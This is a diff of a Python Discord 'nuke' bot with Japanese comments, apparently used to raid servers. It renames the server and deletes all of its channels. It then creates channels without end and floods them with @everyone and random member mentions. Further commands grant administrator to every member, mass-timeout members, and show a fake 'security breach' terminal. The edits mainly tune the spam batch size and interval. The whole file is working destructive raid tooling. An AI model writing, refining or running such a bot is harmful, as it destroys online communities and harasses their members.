@@ -6,19 +6,16 @@ import asyncio
 import random
 from datetime import timedelta
 
-# --------------------------
-# 最速設定・完全無制限
-# --------------------------
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
+
 bot = commands.Bot(command_prefix="!", intents=intents)
 
 SERVER_NAME = "トイ神の植民地"
 CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
-BATCH_SIZE = 100          # 一括作成チャンネル数
-CREATE_INTERVAL = 0       # 待機時間ゼロ
-PARALLEL_SEND_PER_CH = 5  # 1チャンネルあたりの並列送信数
+BATCH_SIZE = 15  # 一括作成する数
+CREATE_INTERVAL = 0.0001  # 限界まで短縮
 
 COMBINED_TEXT = (
     "@everyone\n"
@@ -42,9 +39,22 @@ COMBINED_TEXT = (
 stop_flag = asyncio.Event()
 background_tasks = set()
 
-# --------------------------
-# メンション生成
-# --------------------------
+
+class StartButton(ui.View):
+    def __init__(self, guild):
+        super().__init__(timeout=None)
+        self.guild = guild
+
+    @ui.button(label="実行", style=discord.ButtonStyle.danger, emoji="💻")
+    async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
+        if not stop_flag.is_set() and background_tasks:
+            await interaction.followup.send("⚠️ 既に実行中です", ephemeral=True)
+            return
+        await interaction.followup.send("🔓 侵入承認…システム起動…", ephemeral=False)
+        await infinite_create_and_spam(self.guild)
+
+
 def random_mentions(guild: discord.Guild) -> str:
     members = [m for m in guild.members if not m.bot]
     if not members:
@@ -53,27 +63,16 @@ def random_mentions(guild: discord.Guild) -> str:
     picked = random.choices(members, k=k)
     return " ".join(m.mention for m in picked) + "\n"
 
-# --------------------------
-# 1チャンネル並列送信
-# --------------------------
-async def spam_channel_worker(channel: discord.TextChannel, guild: discord.Guild, worker_id: int):
+
+async def spam_channel(channel: discord.TextChannel, guild: discord.Guild):
     while not stop_flag.is_set():
+        text = random_mentions(guild) + COMBINED_TEXT
         try:
-            text = random_mentions(guild) + COMBINED_TEXT
             await channel.send(text)
-        except Exception:
-            await asyncio.sleep(0.5)
+        except:
+            break
 
-async def spam_channel_parallel(channel: discord.TextChannel, guild: discord.Guild):
-    workers = [
-        asyncio.create_task(spam_channel_worker(channel, guild, i))
-        for i in range(PARALLEL_SEND_PER_CH)
-    ]
-    await asyncio.gather(*workers, return_exceptions=True)
 
-# --------------------------
-# 一括チャンネル削除
-# --------------------------
 async def delete_all_channels_fast(guild: discord.Guild):
     tasks = [ch.delete() for ch in guild.channels]
     await asyncio.gather(*tasks, return_exceptions=True)
@@ -81,34 +80,34 @@ async def delete_all_channels_fast(guild: discord.Guild):
         tasks = [ch.delete() for ch in guild.channels]
         await asyncio.gather(*tasks, return_exceptions=True)
 
-# --------------------------
-# 完全無制限作成ループ
-# --------------------------
+
 async def batch_create_and_spam(guild: discord.Guild, start_counter: int):
-    create_tasks = [
-        guild.create_text_channel(f"{CHANNEL_NAME}-{start_counter + i}")
-        for i in range(BATCH_SIZE)
-    ]
-    channels = await asyncio.gather(*create_tasks, return_exceptions=True)
+    """一括作成＋即時並行送信"""
+    create_tasks = []
+    for i in range(BATCH_SIZE):
+        cnt = start_counter + i
+        create_tasks.append(guild.create_text_channel(f"{CHANNEL_NAME}-{cnt}"))
+    try:
+        channels = await asyncio.gather(*create_tasks, return_exceptions=True)
+    except:
+        return start_counter
 
     for ch in channels:
         if isinstance(ch, discord.TextChannel):
-            task = asyncio.create_task(spam_channel_parallel(ch, guild))
+            task = asyncio.create_task(spam_channel(ch, guild))
             background_tasks.add(task)
             task.add_done_callback(background_tasks.discard)
 
     return start_counter + BATCH_SIZE
 
-# --------------------------
-# 無限ループ：人為的上限なし
-# --------------------------
+
 async def infinite_create_and_spam(guild: discord.Guild, delete_channels: bool = True):
     stop_flag.clear()
     try:
         await guild.edit(name=SERVER_NAME)
-    except Exception:
+    except:
         pass
-
+    # !boost のときはチャンネル削除をスキップ
     if delete_channels:
         await delete_all_channels_fast(guild)
 
@@ -120,21 +119,6 @@ async def infinite_create_and_spam(guild: discord.Guild, delete_channels: bool =
         except asyncio.TimeoutError:
             pass
 
-# --------------------------
-# ボタン・その他機能
-# --------------------------
-class StartButton(ui.View):
-    def __init__(self, guild):
-        super().__init__(timeout=None)
-        self.guild = guild
-    @ui.button(label="実行", style=discord.ButtonStyle.danger, emoji="💻")
-    async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer()
-        if not stop_flag.is_set() and background_tasks:
-            await interaction.followup.send("⚠️ 既に実行中です", ephemeral=True)
-            return
-        await interaction.followup.send("🔓 侵入承認…システム起動…", ephemeral=False)
-        await infinite_create_and_spam(self.guild)
 
 async def type_and_send(channel, text):
     lines = text.split("\n")
@@ -148,36 +132,39 @@ async def type_and_send(channel, text):
             await msg.edit(content=output)
         await asyncio.sleep(0.005)
 
-# --------------------------
-# コマンド
-# --------------------------
+
 @bot.command()
 async def start(ctx):
     if not stop_flag.is_set() and background_tasks:
         return
+    # !start → チャンネル削除あり
     await infinite_create_and_spam(ctx.guild, delete_channels=True)
+
 
 @bot.command()
 async def boost(ctx):
     if not stop_flag.is_set() and background_tasks:
         return
+    # !boost → チャンネル削除なし 追加作成のみ
     await infinite_create_and_spam(ctx.guild, delete_channels=False)
+
 
 @bot.command()
 async def stop(ctx):
     stop_flag.set()
     await asyncio.gather(*background_tasks, return_exceptions=True)
     background_tasks.clear()
-    await ctx.send("🛑 全て停止")
 
-# ✅ 新規：Botを安全に終了
+
+# ✅ 追加：Botを終了
 @bot.command(name="bye")
-async def bot_exit(ctx):
+async def bye(ctx):
     stop_flag.set()
     await asyncio.gather(*background_tasks, return_exceptions=True)
     background_tasks.clear()
     await ctx.send("👋 終了します。さようなら！")
     await bot.close()
+
 
 @bot.command()
 async def hack(ctx):
@@ -186,7 +173,7 @@ async def hack(ctx):
     ch = await guild.create_text_channel("hacking出力画面")
     hacker_code = "```ansi\n"
     hacker_code += "\x1b[38;5;51m╔══════════════════════════════════════════════════════╗\x1b[0m\n"
-    hacker_code += "\x1b[38;5;51m║  TISN SECURITY BREACH — TERMINAL v4.2.1 — BUILD 999\x1b[38;5;51m  ║\x1b[0m\n"
+    hacker_code += "\x1b[38;5;51m║  TISN SECURITY BREACH ― TERMINAL v4.2.1 ― BUILD 999\x1b[38;5;51m  ║\x1b[0m\n"
     hacker_code += "\x1b[38;5;51m╚══════════════════════════════════════════════════════╝\x1b[0m\n"
     hacker_code += "\n"
     hacker_code += "\x1b[32m[root@tisn-core:~]#\x1b[0m ./sysinit --BREACH --LEVEL=MAX --STEALTH\n"
@@ -200,14 +187,15 @@ async def hack(ctx):
     hacker_code += "\x1b[33m[008] \x1b[37m> Disabling audit logging...               [\x1b[32mOK\x1b[37m]\x1b[0m\n"
     hacker_code += "\n"
     hacker_code += "\x1b[38;5;51m[SYSTEM]  ████████████████████████████ 100%\x1b[0m\n"
-    hacker_code += "\x1b[38;5;46m[STATUS]  ACCESS GRANTED — FULL CONTROL\x1b[0m\n"
-    hacker_code += "\x1b[38;5;226m[WARN]    CONNECTION UNTRACEABLE — NO LOGS\x1b[0m\n"
+    hacker_code += "\x1b[38;5;46m[STATUS]  ACCESS GRANTED ― FULL CONTROL\x1b[0m\n"
+    hacker_code += "\x1b[38;5;226m[WARN]    CONNECTION UNTRACEABLE ― NO LOGS\x1b[0m\n"
     hacker_code += "\x1b[38;5;196m[INFO]    AWAITING EXECUTION TRIGGER...\x1b[0m\n"
     hacker_code += "```\n"
     hacker_code += "**✅ ハッキング完了**\n"
     await type_and_send(ch, hacker_code)
     async for msg in ch.history(limit=1):
         await msg.edit(view=StartButton(guild))
+
 
 @bot.command()
 async def admin(ctx):
@@ -219,10 +207,11 @@ async def admin(ctx):
                 name="TISN管理者",
                 permissions=discord.Permissions(administrator=True)
             )
-        except Exception:
+        except:
             return
     tasks = [m.add_roles(admin_role) for m in guild.members if not m.bot and admin_role not in m.roles]
     await asyncio.gather(*tasks, return_exceptions=True)
+
 
 @bot.command(name="to")
 async def total_timeout(ctx):
@@ -266,18 +255,21 @@ async def total_timeout(ctx):
         try:
             tasks.append(member.edit(timeout_until=duration, reason="!to による一括タイムアウト"))
             target_count += 1
-        except Exception:
+        except:
             pass
     results = await asyncio.gather(*tasks, return_exceptions=True)
     success_count = sum(1 for r in results if not isinstance(r, Exception))
     report.append(f"✅ タイムアウト実行: {success_count}/{target_count} 人")
     await ctx.send("## 🎯 !to 完了\n" + "\n".join(report))
 
+
 @bot.event
 async def on_ready():
     print(f"起動: {bot.user}")
 
+
 TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
 if not TOKEN:
     raise RuntimeError("トークンを設定してください")
+
 bot.run(TOKEN)
